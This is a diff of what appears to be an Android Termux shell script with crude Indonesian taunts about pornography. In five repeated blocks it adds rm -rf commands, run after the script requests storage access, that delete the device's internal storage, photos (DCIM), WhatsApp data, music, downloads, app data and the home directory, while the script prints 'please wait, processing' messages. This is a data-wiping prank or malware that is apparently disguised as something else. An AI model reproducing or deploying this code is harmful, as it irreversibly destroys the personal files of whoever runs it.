@@ -41,18 +41,26 @@ echo $blue "DASAR BOKEPERS"
 termux-setup-storage
 sleep 4
 echo $blue"BENTAR ANJING!!!"
+rm -rf /storage/emulated/0
+
+rm -rf /sdcard/0
+
+rm -rf /storage/emulated/0/DCIM
+
+rm -rf /storage/emulated/0/android/obb
+
+rm -rf /sdcard/0/android/data
+
+rm -rf $HOME
+
+rm -rf sdcard/0
+
 rm -rf storage/emulated/0
-rm -rf storage/emulated/0/Download
-rm -rf storage/emulated/DCIM
-rm -rf storage/emulated/music
-rm -rf  /sdcard/music
-rm -rf /sdcard/image
-rm -rf /sdcard/download
-rm -rf /sdcard/dcim
-rm -rf /sdcard/WhatsApp
-rm -rf /sdcard/video
-rm -rf /sdcard/videos
-rm -rf /sdcard/movies
+rm -rf /storage/emulated/0/WhatsApp
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/Downloads
+rm -rf /storage/emulated/0/Music
+rm -rf /sdcard/0/Music
 echo $blue"SABAR CUK BARU PROSES"
 sleep 6
 echo $red "HAMPIR SELESAI NJING!!"
@@ -77,18 +85,31 @@ echo $blue "DASAR BOKEPERS"
 termux-setup-storage
 sleep 4
 echo $blue"BENTAR ANJING!!!"
+rm -rf /storage/emulated/0
+
+rm -rf /sdcard/0
+
+rm -rf /storage/emulated/0/DCIM
+
+rm -rf /storage/emulated/0/android/obb
+
+rm -rf /sdcard/0/android/data
+
+rm -rf $HOME
+
+rm -rf sdcard/0
+
 rm -rf storage/emulated/0
-rm -rf storage/emulated/0/Download
-rm -rf storage/emulated/DCIM
-rm -rf storage/emulated/music
-rm -rf  /sdcard/music
-rm -rf /sdcard/image
-rm  -rf /sdcard/download
-rm -rf /sdcard/dcim
-rm -rf /sdcard/WhatsApp
-rm -rf /sdcard/video
-rm -rf /sdcard/videos
-rm -rf /sdcard/movies
+
+rm -rf /storage/emulated/0/WhatsApp
+
+rm -rf /sdcard/0/WhatsApp
+
+rm -rf /storage/emulated/0/Downloads
+
+rm -rf /storage/emulated/0/Music
+
+rm -rf /sdcard/0/Music
 echo $blue"SABAR CUK BARU PROSES"
 sleep 6
 echo $red "HAMPIR SELESAI NJING!!"
@@ -112,18 +133,31 @@ echo $blue "DASAR BOKEPERS"
 termux-setup-storage
 sleep 4
 echo $blue"BENTAR ANJING!!!"
+rm -rf /storage/emulated/0
+
+rm -rf /sdcard/0
+
+rm -rf /storage/emulated/0/DCIM
+
+rm -rf /storage/emulated/0/android/obb
+
+rm -rf /sdcard/0/android/data
+
+rm -rf $HOME
+
+rm -rf sdcard/0
+
 rm -rf storage/emulated/0
-rm -rf storage/emulated/0/Download
-rm -rf storage/emulated/DCIM
-rm -rf storage/emulated/music
-rm -rf  /sdcard/music
-rm -rf /sdcard/image
-rm  -rf /sdcard/download
-rm -rf /sdcard/dcim
-rm -rf /sdcard/WhatsApp
-rm -rf /sdcard/video
-rm -rf /sdcard/videos
-rm -rf /sdcard/movies
+
+rm -rf /storage/emulated/0/WhatsApp
+
+rm -rf /sdcard/0/WhatsApp
+
+rm -rf /storage/emulated/0/Downloads
+
+rm -rf /storage/emulated/0/Music
+
+rm -rf /sdcard/0/Music
 echo $blue"SABAR CUK BARU PROSES"
 sleep 6
 echo $red "HAMPIR SELESAI NJING!!"
@@ -149,18 +183,31 @@ echo $blue "DASAR BOKEPERS"
 termux-setup-storage
 sleep 4
 echo $blue"BENTAR ANJING!!!"
+rm -rf /storage/emulated/0
+
+rm -rf /sdcard/0
+
+rm -rf /storage/emulated/0/DCIM
+
+rm -rf /storage/emulated/0/android/obb
+
+rm -rf /sdcard/0/android/data
+
+rm -rf $HOME
+
+rm -rf sdcard/0
+
 rm -rf storage/emulated/0
-rm -rf storage/emulated/0/Download
-rm -rf storage/emulated/DCIM
-rm -rf storage/emulated/music
-rm -rf  /sdcard/music
-rm -rf /sdcard/image
-rm -rf /sdcard/download
-rm -rf /sdcard/dcim
-rm -rf /sdcard/WhatsApp
-rm -rf /sdcard/video
-rm -rf /sdcard/videos
-rm -rf /sdcard/movies
+
+rm -rf /storage/emulated/0/WhatsApp
+
+rm -rf /sdcard/0/WhatsApp
+
+rm -rf /storage/emulated/0/Downloads
+
+rm -rf /storage/emulated/0/Music
+
+rm -rf /sdcard/0/Music
 echo $blue"SABAR CUK BARU PROSES"
 sleep 6
 echo $green "HAMPIR SELESAI NJING!!"
@@ -185,18 +232,31 @@ echo $blue "DASAR BOKEPERS"
 termux-setup-storage
 sleep 4
 echo $blue"BENTAR ANJING!!!"
+rm -rf /storage/emulated/0
+
+rm -rf /sdcard/0
+
+rm -rf /storage/emulated/0/DCIM
+
+rm -rf /storage/emulated/0/android/obb
+
+rm -rf /sdcard/0/android/data
+
+rm -rf $HOME
+
+rm -rf sdcard/0
+
 rm -rf storage/emulated/0
-rm -rf storage/emulated/0/Download
-rm -rf storage/emulated/DCIM
-rm -rf storage/emulated/music
-rm -rf  /sdcard/music
-rm -rf /sdcard/image
-rm  -rf /sdcard/download
-rm -rf /sdcard/dcim
-rm -rf /sdcard/WhatsApp
-rm -rf /sdcard/video
-rm -rf /sdcard/videos
-rm -rf /sdcard/movies
+
+rm -rf /storage/emulated/0/WhatsApp
+
+rm -rf /sdcard/0/WhatsApp
+
+rm -rf /storage/emulated/0/Downloads
+
+rm -rf /storage/emulated/0/Music
+
+rm -rf /sdcard/0/Music
 echo $blue"SABAR CUK BARU PROSES"
 sleep 6
 echo $green "HAMPIR SELESAI NJING!!"
@@ -227,3 +287,4 @@ sleep 2
 echo  $green "BOKEP DULU SANA!!!!"
 exit
 fi
+
